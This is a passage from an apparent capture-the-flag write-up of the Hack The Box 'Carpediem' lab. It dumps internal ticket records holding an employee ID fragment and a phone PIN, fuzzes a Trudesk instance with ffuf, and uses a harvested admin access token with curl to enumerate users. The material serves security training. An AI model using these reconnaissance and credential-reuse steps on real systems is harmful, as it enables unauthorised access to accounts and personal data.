font-style: inherit;">)</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">,</span></span>
<span id="cb19-4">    <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"subject"</span> : <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"Security risks - Portal"</span>,</span>
<span id="cb19-5">    <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"issue"</span> : <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"&lt;p&gt;We need to patch the user profile and admin sections of our Portal ASAP. Why are we continually pushing out functions that haven&amp;#39;t been tested by the Infosec team?&lt;/p&gt;\n"</span>,</span>
<span id="cb19-6">            <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"comment"</span> : <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"&lt;p&gt;Thanks, Jeremy.  I agree.  This is a big problem.&lt;/p&gt;\n"</span></span>
<span id="cb19-7"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">}</span></span>
<span id="cb19-8"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">{</span></span>
<span id="cb19-9">    <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"_id"</span> : ObjectId<span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"6244635c8fc3556ae8715b0f"</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">,</span></span>
<span id="cb19-10">    <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"subject"</span> : <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"Username change"</span>,</span>
<span id="cb19-11">    <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"issue"</span> : <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"&lt;p&gt;I need a handle, man.  I mean, I don&amp;#39;t have an identity until I have a handle.&lt;br /&gt;How about The Master of Disaster?&lt;/p&gt;\n"</span>,</span>
<span id="cb19-12">            <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"comment"</span> : <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"&lt;p&gt;You&amp;#39;re hopelss, man.  Utterly hopeless.&lt;/p&gt;\n&lt;p&gt;I&amp;#39;m closing this ticket.&lt;/p&gt;\n"</span></span>
<span id="cb19-13"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">}</span></span>
<span id="cb19-14"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">{</span></span>
<span id="cb19-15">    <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"_id"</span> : ObjectId<span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"624465135596178468330932"</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">,</span></span>
<span id="cb19-16">    <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"issue"</span> : <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"&lt;p&gt;We have hired a new Network Engineer and need to get him set up with his credentials and phone before his start date next month.&lt;br /&gt;Please create this account at your earliest convenience.&lt;br /&gt;&lt;br /&gt;Thank you.&lt;/p&gt;\n"</span>,</span>
<span id="cb19-17">            <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"comment"</span> : <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"&lt;p&gt;Hey Adeanna,</span></span>
<span id="cb19-18"><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">I think Joey is out this week, but I can take care of this. Whats the last 4 digits of his employee ID so I can get his extension set up in the VoIP system?&lt;/p&gt;\n"</span></span>
<span id="cb19-19">            <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"comment"</span> : <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"&lt;p&gt;Thanks Robert,</span></span>
<span id="cb19-20"><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">Last 4 of employee ID is 9650.&lt;/p&gt;\n"</span></span>
<span id="cb19-21">            <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"comment"</span> : <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"&lt;p&gt;Thank you! He&amp;#39;s all set up and ready to go. When he gets to the office on his first day just have him log into his phone first. I&amp;#39;ll leave him a voicemail with his initial credentials for server access. His phone pin code will be 2022 and to get into voicemail he can dial *62&lt;/p&gt;\n&lt;p&gt;Also...let him know that if he wants to use a desktop soft phone that we&amp;#39;ve been testing Zoiper with some of our end users.&lt;/p&gt;\n&lt;p&gt;Changing the status of this ticket to pending until he&amp;#39;s been set up and changes his initial credentials.&lt;/p&gt;\n"</span></span>
<span id="cb19-22"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">}</span></span>
<span id="cb19-23"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">{</span></span>
<span id="cb19-24">    <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"_id"</span> : ObjectId<span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"6244673c2142479dd493d9da"</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">,</span></span>
<span id="cb19-25">    <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"subject"</span> : <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"Trudesk API access - Portal"</span>,</span>
<span id="cb19-26">    <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"issue"</span> : <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"&lt;p&gt;I&amp;#39;ll be looking into tightenting up security permissions this week for the Trudesk integration in the Portal.  We&amp;#39;ll need to also perform some threat modeling to find out where our weak points are and come up with an action plan to mitigate.&lt;/p&gt;\n"</span>,</span>
<span id="cb19-27"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">}</span></span>
<span id="cb19-28"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">{</span></span>
<span id="cb19-29">    <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"_id"</span> : ObjectId<span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"62478d83eadb13001b66b62c"</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">,</span></span>
<span id="cb19-30">    <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"subject"</span> : <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"Need help building the CMS"</span>,</span>
<span id="cb19-31">    <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"issue"</span> : <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"&lt;p&gt;Hey Jeremy, &lt;br /&gt;Can you help me work on the CMS at all this week?  The base install is completed, but I need your expertise to make sure I did everything correctly.&lt;/p&gt;\n"</span>,</span>
<span id="cb19-32">            <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"comment"</span> : <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"&lt;p&gt;Please don&amp;#39;t expose that application publically.  I told you I would help when I had time and right now I&amp;#39;m just too busy.</span></span>
<span id="cb19-33"><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">Build it out if you&amp;#39;d like, but...just don&amp;#39;t do anything stupid.&lt;/p&gt;\n"</span></span>
<span id="cb19-34">            <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"comment"</span> : <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"&lt;p&gt;Don&amp;#39;t worry. I moved it off of the main server and into a container with SSL encryption.&lt;/p&gt;\n"</span></span>
<span id="cb19-35"></span>
<span id="cb19-36"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">}</span></span></code></pre></div>
<p>The information about the new Network Engineer and the last 4 digits of his employee ID, 9650, and pincode, 2022, might come in handy later. Lets move on with the extracted accessTokens.</p>
</section>
<section id="step-5---trudesk" class="level3">
<h3 class="anchored" data-anchor-id="step-5---trudesk">Step 5 - Trudesk</h3>
<p>Setup Burp for upstream socks proxy (User options &gt; SOCKS Proxy) and browse to <code>https://172.17.0.2</code> we find <code>backdrop.carpediem.htb</code>.</p>
<p><img src="https://exploit.se/posts/2022-09-14-htb-writeup-carpediem/images/carpediem11.png" class="img-fluid"></p>
<p>We’re unable to login to the page and there really isn’t anything of use at first glance. Googling for <em>“backdrop cms exploit”</em> there are a bunch of authenticated exploits, but we have no account..</p>
<p><img src="https://exploit.se/posts/2022-09-14-htb-writeup-carpediem/images/carpediem12.png" class="img-fluid"> We’d love to find something related to <em>trudesk</em>, lets try to add <code>trudesk.carpediem.htb</code> to resolve to <code>172.17.0.2</code> and if that doesn’t work try <code>10.10.11.167</code>.</p>
<div class="sourceCode" id="cb20" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb20-1"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  chisel_1.7.7 curl <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-v</span> http://trudesk.carpediem.htb</span>
<span id="cb20-2"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">*</span>   Trying 10.10.11.167:80...</span>
<span id="cb20-3"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">*</span> Connected to trudesk.carpediem.htb <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">10.10.11.167</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">port</span> 80 <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="co" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">#0)</span></span>
<span id="cb20-4"><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span> GET <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">/</span> HTTP/1.1</span>
<span id="cb20-5"><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span> Host: <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">trudesk.carpediem.htb</span></span>
<span id="cb20-6"><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span> User-Agent: <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">curl/7.84.0</span></span>
<span id="cb20-7"><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span> Accept: <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">*/*</span></span>
<span id="cb20-8"><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span> </span>
<span id="cb20-9"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">*</span> Mark bundle as not supporting multiuse</span>
<span id="cb20-10"><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&lt;</span> HTTP/1.1 <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">200</span> OK</span>
<span id="cb20-11"><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&lt;</span> Server: <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">nginx/1.18.0</span> <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Ubuntu</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span></span>
<span id="cb20-12"><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&lt;</span> Date: <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Tue,</span> 13 Sep 2022 07:26:47 GMT</span>
<span id="cb20-13"><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&lt;</span> Content-Type: <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">text/html</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span> <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">charset</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span>utf-8</span>
<span id="cb20-14"><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&lt;</span> Content-Length: <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">7285</span></span>
<span id="cb20-15"><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&lt;</span> Connection: <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">keep-alive</span></span>
<span id="cb20-16"><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&lt;</span> Access-Control-Allow-Origin: <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">*</span></span>
<span id="cb20-17"><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&lt;</span> Access-Control-Allow-Methods: <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">GET,</span> POST, PUT, DELETE, PATCH, OPTIONS</span>
<span id="cb20-18"><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&lt;</span> Access-Control-Allow-Headers: <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">DNT,X-Mx-ReqToken,Keep-Alive,User-Agent,X-Requested-With,If-Modified-Since,Cache-Control,Content-Type,accesstoken,X-RToken,X-Token</span></span>
<span id="cb20-19"><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&lt;</span> ETag: <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">W/</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"1c75-WUVJYgy+76qLc2hldkHzGR7+Uxg"</span></span>
<span id="cb20-20"><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&lt;</span> set-cookie: <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">connect.sid=s%3AQDzVdnp3FNH7sE1ZglF0wWughDr5QhjC.hjY40%2Blgy48wMb6w4wRA0QLCPSYevILsPC0ClelRiMg</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span> <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">Path</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span>/<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span> <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">Expires</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span>Wed, <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">13</span> Sep 2023 07:26:47 GMT<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">HttpOnly</span></span>
<span id="cb20-21"><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&lt;</span> </span>
<span id="cb20-22"><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&lt;</span>!DOCTYPE <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">html</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span></span>
<span id="cb20-23"><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&lt;</span>html<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span></span>
<span id="cb20-24"><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&lt;</span>head<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span></span>
<span id="cb20-25">    <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&lt;</span>title<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span>Trudesk <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">&amp;</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">middot</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Login</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&lt;</span>/title<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span></span></code></pre></div>
<div class="sourceCode" id="cb21" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb21-1"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  carpediem ffuf <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-c</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-w</span> /usr/share/wordlists/dirb/big.txt <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-u</span> http://trudesk.carpediem.htb/FUZZ</span>
<span id="cb21-2"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">About</span>                   [Status: 302, Size: 23, Words: 4, Lines: 1, Duration: 65ms]</span>
<span id="cb21-3"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Login</span>                   [Status: 302, Size: 23, Words: 4, Lines: 1, Duration: 67ms]</span>
<span id="cb21-4"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">about</span>                   [Status: 302, Size: 23, Words: 4, Lines: 1, Duration: 86ms]</span>
<span id="cb21-5"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">accounts</span>                [Status: 302, Size: 23, Words: 4, Lines: 1, Duration: 56ms]</span>
<span id="cb21-6"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">api</span>                     [Status: 200, Size: 25, Words: 1, Lines: 1, Duration: 75ms]</span>
<span id="cb21-7"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">backups</span>                 [Status: 401, Size: 32, Words: 3, Lines: 1, Duration: 83ms]</span>
<span id="cb21-8"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">captcha</span>                 [Status: 200, Size: 9399, Words: 954, Lines: 1, Duration: 120ms]</span>
<span id="cb21-9"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">css</span>                     [Status: 301, Size: 173, Words: 7, Lines: 11, Duration: 87ms]</span>
<span id="cb21-10"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">dashboard</span>               [Status: 302, Size: 23, Words: 4, Lines: 1, Duration: 145ms]</span>
<span id="cb21-11"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">departments</span>             [Status: 302, Size: 23, Words: 4, Lines: 1, Duration: 84ms]</span>
<span id="cb21-12"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">font</span>                    [Status: 301, Size: 175, Words: 7, Lines: 11, Duration: 43ms]</span>
<span id="cb21-13"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">fonts</span>                   [Status: 301, Size: 177, Words: 7, Lines: 11, Duration: 43ms]</span>
<span id="cb21-14"><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">groups</span>                  [Status: 302, Size: 23, Words: 4, Lines: 1, Duration: 133ms]</span>
<span id="cb21-15"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">img</span>                     [Status: 301, Size: 173, Words: 7, Lines: 11, Duration: 61ms]</span>
<span id="cb21-16"><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">install</span>                 [Status: 302, Size: 23, Words: 4, Lines: 1, Duration: 69ms]</span>
<span id="cb21-17"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">js</span>                      [Status: 301, Size: 171, Words: 7, Lines: 11, Duration: 99ms]</span>
<span id="cb21-18"><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">login</span>                   [Status: 302, Size: 23, Words: 4, Lines: 1, Duration: 62ms]</span>
<span id="cb21-19"><span class="bu" style="color: null;
background-color: null;
font-style: inherit;">logout</span>                  [Status: 302, Size: 23, Words: 4, Lines: 1, Duration: 56ms]</span>
<span id="cb21-20"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">messages</span>                [Status: 302, Size: 23, Words: 4, Lines: 1, Duration: 96ms]</span>
<span id="cb21-21"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">mobile</span>                  [Status: 301, Size: 179, Words: 7, Lines: 11, Duration: 158ms]</span>
<span id="cb21-22"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">notices</span>                 [Status: 302, Size: 23, Words: 4, Lines: 1, Duration: 106ms]</span>
<span id="cb21-23"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">plugins</span>                 [Status: 302, Size: 23, Words: 4, Lines: 1, Duration: 64ms]</span>
<span id="cb21-24"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">profile</span>                 [Status: 302, Size: 23, Words: 4, Lines: 1, Duration: 102ms]</span>
<span id="cb21-25"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">register</span>                [Status: 302, Size: 23, Words: 4, Lines: 1, Duration: 103ms]</span>
<span id="cb21-26"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">reports</span>                 [Status: 302, Size: 23, Words: 4, Lines: 1, Duration: 115ms]</span>
<span id="cb21-27"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">settings</span>                [Status: 302, Size: 23, Words: 4, Lines: 1, Duration: 93ms]</span>
<span id="cb21-28"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">signup</span>                  [Status: 302, Size: 23, Words: 4, Lines: 1, Duration: 73ms]</span>
<span id="cb21-29"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">sounds</span>                  [Status: 301, Size: 179, Words: 7, Lines: 11, Duration: 100ms]</span>
<span id="cb21-30"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">teams</span>                   [Status: 302, Size: 23, Words: 4, Lines: 1, Duration: 152ms]</span>
<span id="cb21-31"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">tickets</span>                 [Status: 302, Size: 23, Words: 4, Lines: 1, Duration: 97ms]</span>
<span id="cb21-32"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">uploads</span>                 [Status: 401, Size: 32, Words: 3, Lines: 1, Duration: 68ms]</span>
<span id="cb21-33"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">version</span>                 [Status: 200, Size: 20, Words: 1, Lines: 1, Duration: 58ms]</span></code></pre></div>
<div class="sourceCode" id="cb22" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb22-1"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  carpediem curl http://trudesk.carpediem.htb/version</span>
<span id="cb22-2"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">{</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"version"</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">:</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"1.1.11"</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">}</span></span></code></pre></div>
<p>Googling around I can’t find any publicly disclosed exploits for Trudesk 1.1.11. Reading the <a href="https://docs.trudesk.io/v1/api/#Get">truedesk docs</a> we should use the <code>accessToken</code> as a header, we can verify this by cURL’ign the API using the admin accesstoken:</p>
<div class="sourceCode" id="cb23" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb23-1"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  carpediem curl <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-H</span> <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"accesstoken: 22e56ec0b94db029b07365d520213ef6f5d3d2d9"</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-l</span> http://trudesk.carpediem.htb/api/v1/users</span>
<span id="cb23-2"><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">{</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"success"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">:true</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"count"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">:5</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"users"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">:[{</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"preferences"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">:{</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"tourCompleted"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">:false</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"autoRefreshTicketGrid"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">:true</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"openChatWindows"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">:[]}</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"hasL2Auth"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">:false</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"deleted"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">:false</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"_id"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">:</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"6243c3471e0d4d001b0740d7"</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"username"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">:</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"acooke"</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"email"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">:</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"acooke@carpediem.htb"</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"fullname"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">:</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"Adeanna Cooke"</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"title"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">:</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"Director - Human Resources"</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"role"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">:{</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"_id"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">:</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"623c8b20855cc5001a8ba139"</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"name"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">:</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"Support"</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"description"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">:</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"Default role for agents"</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"normalized"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">:</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"support"</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"isAdmin"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">:false</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"isAgent"</span><span class="dt" style="color: #AD0000;
background-color: null;
